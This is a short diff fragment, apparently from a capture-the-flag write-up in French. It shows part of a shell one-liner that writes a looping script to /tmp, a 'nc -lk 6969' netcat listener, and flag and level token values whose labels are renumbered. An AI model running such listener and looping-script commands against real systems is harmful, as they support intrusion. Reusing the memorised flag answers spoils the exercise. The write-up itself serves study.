@@ -7,6 +7,6 @@ echo '#!/bin/sh' > /tmp/s2.sh ; echo 'while [ 1 ]' >> /tmp/s2.sh ; echo 'do' >> 
 # Pour ouvrir le serveur d'ecoute
 nc -lk 6969
 
-flag11 = woupa2yuojeeaaed06riuj63c
+flag10 = woupa2yuojeeaaed06riuj63c
 
-level11 = fa6v5ateaw21peobuub8ipe6s
+level10 = fa6v5ateaw21peobuub8ipe6s
